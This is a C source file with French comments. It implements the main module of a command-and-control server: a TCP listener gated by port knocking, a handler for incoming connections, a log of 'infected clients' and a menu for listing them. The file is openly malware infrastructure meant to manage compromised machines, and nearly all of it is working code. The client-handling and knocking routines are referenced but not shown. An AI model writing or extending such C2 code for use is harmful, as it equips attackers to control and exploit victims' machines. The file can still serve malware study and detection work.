#include "c2_server.h"
#include "client_handler.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>  // Soucis avec le threat paralele a reverifier

/**
 * Démarre le serveur C2.
 */
void start_server() {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    // Démarrage de l’écoute du port knocking dans un thread séparé
    pthread_t knock_thread;
    pthread_create(&knock_thread, NULL, (void *)start_port_knocking_listener, NULL);

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Erreur lors de la création du socket");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur de liaison");
        exit(EXIT_FAILURE);
    }

    listen(server_sock, 5);
    printf("Serveur C2 en attente de connexions sur le port %d...\n", SERVER_PORT);

    while (1) {
        client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_len);

        // Vérification de la séquence de port knocking
        if (is_knock_sequence_valid(client_addr.sin_addr.s_addr)) {
            printf("Connexion autorisée pour %s\n", inet_ntoa(client_addr.sin_addr));
            handle_client(client_sock);
        } else {
            printf("Connexion refuse pour %s \n", inet_ntoa(client_addr.sin_addr));
            close(client_sock);
        }
    }

    close(server_sock);
}


/**
 * Enregistre les données d'un client infecté.
 */
void save_client_data(const char *client_info) {
    FILE *file = fopen(DATA_FILE, "a");
    if (file) {
        fprintf(file, "%s\n", client_info);
        fclose(file);
    }
}

/**
 * Affiche la liste des clients infectés.
 */
void list_infected_clients() {
    FILE *file = fopen(DATA_FILE, "r");
    if (file) {
        char line[256];
        printf("\n--- Clients infectés ---\n");
        while (fgets(line, sizeof(line), file)) {
            printf("%s", line);
        }
        fclose(file);
    } else {
        printf("Aucun client infecté enregistré.\n");
    }
}

/**
 * Menu interactif du serveur C2.
 */
int main() {
    int choix;
    while (1) {
        printf("\n=== C2 Server ===\n");
        printf("1. Démarrer le serveur\n");
        printf("2. Lister les clients infectés\n");
        printf("3. Quitter\n");
        printf("Choix: ");
        scanf("%d", &choix);

        switch (choix) {
            case 1: start_server(); break;
            case 2: list_infected_clients(); break;
            case 3: exit(0);
            default: printf("Option invalide.\n");
        }
    }
}
